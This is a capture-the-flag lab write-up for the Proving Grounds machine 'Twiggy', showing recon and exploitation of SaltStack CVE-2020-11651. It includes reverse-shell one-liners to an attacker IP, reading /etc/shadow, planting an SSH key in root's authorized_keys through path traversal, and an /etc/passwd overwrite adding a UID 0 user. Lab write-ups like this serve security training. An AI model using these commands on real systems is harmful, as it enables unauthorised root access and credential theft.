# Twiggy

## Initial access

Ran `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.224.62
```

Open ports discovered:

- **22** — SSH (OpenSSH 7.4 (protocol 2.0))
- **53** — DNS (NLnet Labs NSD)
- **80** — HTTP
  - Additional webpages:
    - `http://192.168.224.62/admin/login/`
- **4505**
- **4506**
- **8000** — HTTP

Ran a detailed `nmap` scan to identify service versions:

```
nmap -sVC -p- -v -T4 -sT --open 192.168.224.62
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-favicon: Unknown favicon MD5: 11FB4799192313DD5474A343D9CC0A17
|_http-title: Home | Mezzanine
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

Key findings from the scan:

- **Port 80** — HTTP (nginx 1.16.1), serving a Mezzanine CMS site
- **Ports 4505/4506** — ZeroMQ ZMTP 2.0 (ZeroMQ Message Transport Protocol)
- **Port 8000** — HTTP (nginx 1.16.1), returning JSON responses

Researched ports 4505 and 4506 running ZMTP online:

```
**Port 4505 running ZeroMQ Message Transport Protocol (ZMTP)** is the default publisher port used by a **SaltStack (Salt) Master** to communicate with managed nodes (minions). It almost always appears alongside **port 4506** (the request/return server port).
```

This indicates the target is running **SaltStack**, a infrastructure automation tool. Searched for known vulnerabilities in SaltStack:

```
searchsploit saltstack
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Saltstack 3000.1 - Remote Code Execution                                           | multiple/remote/48421.txt
----------------------------------------------------------------------------------- ---------------------------------
```

Found **CVE-2020-11651**, a SaltStack remote code execution vulnerability. Downloaded the exploit script for review:

```
searchsploit -m 48421

nano 48421.txt
...
parser.add_option('-m', '--master', action='store', help='Salt Master')
parser.add_option('-x', '--exec', action='store', help='Command to execute')
parser.add_option('-r', '--read', action='store', help='File to read')
parser.add_option('-u', '--upload-src', action='store', help='File to upload (source)')
parser.add_option('-d', '--upload-dest', action='store', help='File to upload (destination)')
```

The exploit supports command execution (`--exec`), file reading (`-r`), and file upload (`--upload-src` / `--upload-dest`). Downloaded the original PoC from GitHub:

```
wget https://raw.githubusercontent.com/jasperla/CVE-2020-11651-poc/refs/heads/master/exploit.py
```

The exploit requires the `salt` Python package (`pip install salt`).

Attempted to obtain a reverse shell via the RCE using multiple approaches (bash, socat, netcat), but none succeeded:

```
python3 exploit.py -m 192.168.224.62 --exec "bash -i >& /dev/tcp/192.168.45.208/4444 0>&1"

python3 exploit.py -m 192.168.224.62 --exec "socat TCP:192.168.45.208:4444 EXEC:bash"

python3 exploit.py -m 192.168.224.62 --exec "nc 192.168.45.208 4444 -e /bin/sh"
```

Switched to using the file reading capability of the exploit to enumerate the target system:

```
python3 exploit.py -m 192.168.224.62 -r /etc/passwd
/home/kali/OSCP/exploit.py:66: SyntaxWarning: 'return' in a 'finally' block
  return root_key  # noqa: B012
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.14/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.224.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to read /etc/passwd from 192.168.224.62
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
```

The `/etc/passwd` file revealed a `root` user with a login shell (`/bin/bash`). Read the `/etc/shadow` file to obtain the root password hash:

```
python3 exploit.py -m 192.168.224.62 -r /etc/shadow
/home/kali/OSCP/exploit.py:66: SyntaxWarning: 'return' in a 'finally' block
  return root_key  # noqa: B012
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.14/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.224.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to read /etc/shadow from 192.168.224.62
root:$6$WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/:18400:0:99999:7:::
bin:*:17834:0:99999:7:::
daemon:*:17834:0:99999:7:::
adm:*:17834:0:99999:7:::
lp:*:17834:0:99999:7:::
sync:*:17834:0:99999:7:::
shutdown:*:17834:0:99999:7:::
halt:*:17834:0:99999:7:::
mail:*:17834:0:99999:7:::
operator:*:17834:0:99999:7:::
games:*:17834:0:99999:7:::
ftp:*:17834:0:99999:7:::
nobody:*:17834:0:99999:7:::
systemd-network:!!:18400::::::
dbus:!!:18400::::::
polkitd:!!:18400::::::
sshd:!!:18400::::::
postfix:!!:18400::::::
chrony:!!:18400::::::
mezz:!!:18400::::::
nginx:!!:18400::::::
named:!!:18400::::::
```

Extracted the root password hash: `$6$WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/` (sha512crypt, hashcat mode 1800). Attempted to crack the hash using `hashcat` with the `rockyou.txt` wordlist, but the password was not crackable.

Instead of cracking the password, pivoted to uploading an SSH public key directly onto the target using the exploit's file upload feature:

```
python3 exploit.py -m 192.168.224.62 --upload-src id_rsa.pub --upload-dest ../../../../../../../root/.ssh/authorized_keys
/home/kali/OSCP/exploit.py:66: SyntaxWarning: 'return' in a 'finally' block
  return root_key  # noqa: B012
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.14/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.224.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to upload id_rsa.pub to ../../../../../../../root/.ssh/authorized_keys on 192.168.224.62
[ ] Wrote data to file /srv/salt/../../../../../../../root/.ssh/authorized_keys
```

Verified the public key was successfully written to `/root/.ssh/authorized_keys`:

```
python3 exploit.py -m 192.168.224.62 -r /root/.ssh/authorized_keys
/home/kali/OSCP/exploit.py:66: SyntaxWarning: 'return' in a 'finally' block
  return root_key  # noqa: B012
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.14/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.224.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to read /root/.ssh/authorized_keys from 192.168.224.62
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsPgCqAJzBE9D8XjddnBiQZmmMbJcHE4Jxn9LhnNjdB kali@kali
```

Connected to the target via SSH using the private key, obtaining a root shell:

```
ssh root@192.168.224.62 -i id_rsa
...
[root@twiggy ~]# whoami
root
```

Retrieved the `proof.txt` flag (this machine does not have a `local.txt`):

```
[root@twiggy ~]# cat proof.txt
c044c8400aa33db2fecf7e1c17cdbe29
```

### Alternative Initial Access — /etc/passwd overwrite

Generate a password hash using `openssl passwd` and create a custom `/etc/passwd` file with a new UID 0 user appended (e.g., `pwend:$1$hash$gr6/QAygoP4zISL2SSrfr1:0:0:root:/root:/bin/bash`). Read the target's existing `/etc/passwd` via the CVE-2020-11651 file-read capability, append the new user entry, and overwrite the target's file using the exploit's upload feature with path traversal (`../../../../../../etc/passwd`). SSH into the target as the newly created user with the chosen password, gaining root access.

Credit: [gizembozyel — Proving Grounds Practice Twiggy (Medium)](https://gbozyelg.medium.com/proving-grounds-practice-twiggy-8957372f9c36)
